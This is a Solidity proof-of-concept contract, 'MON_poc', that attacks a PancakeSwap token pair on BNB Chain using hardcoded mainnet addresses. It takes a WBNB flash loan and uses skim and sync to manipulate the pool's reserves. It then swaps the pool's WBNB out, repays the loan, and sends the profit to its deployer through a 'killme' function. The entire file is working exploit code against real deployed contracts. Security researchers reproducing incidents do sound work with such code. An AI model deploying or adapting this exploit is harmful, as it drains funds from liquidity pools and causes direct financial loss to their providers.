// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


import "./IERC20.sol";
import "./console.sol";
import "./IUniswapV2pair.sol";

interface IDDPA_flashloan{
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;

    function getVaultReserve() external view returns (uint256 baseReserve, uint256 quoteReserve);
}


contract MON_poc{
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address public constant DPPAdvanced = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;               //flashloan wbnb and busd
    address public constant token = 0xB695e75359A4037f592845873878c24B74D4db93;
    address public constant LP_token = 0x5A29ba90b0358090adE1f07dD952bf4377453131;           //swap   (token0: wdoge,   token1: wbnb)
    
    address admin;
    uint256 constant fee = 2;
    uint256 Borrow_money_WBNB = 30 * 10 ** 18;
    uint256 Borrow_money_BUSD = 0 * 10 ** 18;

    // bool WBNB_IS_0 = true;
    bool WBNB_IS_0 = false;

    constructor(){
        admin = msg.sender;
    }
    function killme() public {
        IERC20(WBNB).transfer(admin, IERC20(WBNB).balanceOf(address(this)));
    }

    function set_approve_token() public {
        IERC20(WBNB).approve(LP_token, type(uint).max);
        IERC20(token).approve(LP_token, type(uint).max);
    }

    function flashloan_from_DDAP() public {
        (uint256 v0, uint256 v1) = IDDPA_flashloan(DPPAdvanced).getVaultReserve();
        console.log("ddap flash loan start...baseAmount , quoteAmount : ", v0, v1);

        bytes memory _data = "ddap flash loan start...";
        uint256 baseAmount = Borrow_money_WBNB;
        uint256 quoteAmount = Borrow_money_BUSD;
        IDDPA_flashloan(DPPAdvanced).flashLoan(baseAmount, quoteAmount, address(this), _data);

        console.log("now I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));
    }

    function DPPFlashLoanCall(address sender,uint256 baseAmount,uint256 quoteAmount,bytes calldata data) external {
        console.log("now I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));
        // console.log("flashloan logical ways...");

        uint256 transfer_WBNB = IERC20(WBNB).balanceOf(address(this));
        (uint256 reserve0, uint256 reserve1, ) = UniswapV2Pair(LP_token).getReserves();
        console.log("1xxxxxx MON_WBNB_pair reserve0 and reserve1 : ", reserve0, reserve1);          //deposit r1 to swap r0

        IERC20(WBNB).transfer(LP_token, IERC20(WBNB).balanceOf(address(this)));
        console.log("Then transfer WBNB to pancake pair...", IERC20(WBNB).balanceOf(LP_token));
        
        if(WBNB_IS_0){

            uint256 amount1Out = (reserve1 - reserve0 * reserve1 / (reserve0 + transfer_WBNB)) * 9975/10000;   // * (100-fee) / 100
            console.log("2xxxxxxxxxxxxx amount1Out 0:",amount1Out);
            uint256 amount0Out = 0;
            bytes memory data1 = "";
            UniswapV2Pair(LP_token).swap(amount0Out, amount1Out, address(this), data1);
            (uint256 swap0,,) = UniswapV2Pair(LP_token).getReserves();
            if(swap0 + amount1Out <= reserve1 + 1){
                revert("...can not burn the pool...");
            }
        }else{

            uint256 amount0Out = (reserve0 - reserve0 * reserve1 / (reserve1 + transfer_WBNB)) * 9975/10000;     //100 / (100 + fee) get amount out of the pool, if WBNB is reserve1 ,swap reserve0
            console.log("2xxxxxxxxxxxxx amount0Out 1:",amount0Out);
            uint256 amount1Out = 0;
            bytes memory data1 = "";
            UniswapV2Pair(LP_token).swap(amount0Out, amount1Out, address(this), data1);
            (,uint256 swap1,) = UniswapV2Pair(LP_token).getReserves();
            if(swap1 + amount0Out <= reserve0 + 1){
                revert("...can not burn the pool...");
            }
        }
        
        console.log("now I have swaped tokens out: ", IERC20(token).balanceOf(address(this)));
        (uint256 r0, uint256 r1,) = UniswapV2Pair(LP_token).getReserves();
        console.log("2xxxxxxxxxxxxx after I swap, the pool remains: ", r0, r1);        //check the pool

        uint256 transfer_amount2 = IERC20(token).balanceOf(LP_token) * 100/fee;                            //transfer coin to pool
        IERC20(token).transfer(LP_token, transfer_amount2);
        console.log("Transfer MON to pancake pair... I still have", IERC20(token).balanceOf(address(this)));

        skim_pancake();

        (uint256 reserve01, uint256 reserve11, ) = UniswapV2Pair(LP_token).getReserves();
        console.log("4xxxxxx MON_WBNB_pair reserve0 and reserve1 : ", reserve01, reserve11);
        // console.log("4xxxxxx now I have WDoge: ", IERC20(MON).balanceOf(address(this)));
        uint256 draw = IERC20(token).balanceOf(address(this)) * 99/100;                                       //tranfer fee
        IERC20(token).transfer(LP_token, draw);
        uint256 pair_remain = IERC20(token).balanceOf(LP_token);
        
        // (uint256 real1,,) = UniswapV2Pair(LP_token).getReserves();
        // uint256 sub_num1 = real1 - reserve01;
        // uint256 sub_num2 = real2 - reserve11;
        if(WBNB_IS_0){

            uint256 draw_wbnb = (reserve01 - (reserve01 * reserve11) / pair_remain) * 9997/10000;
            console.log("5xxxxxxx draw_amount is 0: ", draw_wbnb);
            uint256 _amount0Out = draw_wbnb;
            uint256 _amount1Out = 0;
            bytes memory _data1 = "";
            UniswapV2Pair(LP_token).swap(_amount0Out, _amount1Out, address(this), _data1);

        }else{

            uint256 draw_wbnb = (reserve11 - (reserve01 * reserve11) / pair_remain) * 9997/10000;
            console.log("5xxxxxxx draw_amount is 1: ", draw_wbnb);
            uint256 _amount0Out = 0;
            uint256 _amount1Out = draw_wbnb;
            bytes memory _data1 = "";
            UniswapV2Pair(LP_token).swap(_amount0Out, _amount1Out, address(this), _data1);
        }
        
        console.log("6xxxxxxxx finally I got WBNB......begin to return money", IERC20(WBNB).balanceOf(address(this)));

        IERC20(WBNB).transfer(DPPAdvanced, Borrow_money_WBNB);     //return flashloan
        console.log("flashloan returned...");
    }

    function skim_pancake() public {
        console.log("3xxxxxxx pancake skim to me...");
        (uint256 reserve0, uint256 reserve1, ) = UniswapV2Pair(LP_token).getReserves();
        console.log("3xxxxxxx MON_WBNB_pair reserve0 and reserve1 : ", reserve0, reserve1);
        UniswapV2Pair(LP_token).skim(address(this));
        UniswapV2Pair(LP_token).sync();
        (uint256 r0, uint256 r1, ) = UniswapV2Pair(LP_token).getReserves();
        console.log("3xxxxxxx -------------after sync MON_WBNB_pair reserve0 and reserve1 : ", r0, r1);
        console.log(" -------------after skim now I have WDoge: ", IERC20(token).balanceOf(address(this)));
        // console.log("-------------after skim now I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));
        console.log("first sync complete...");

    }


}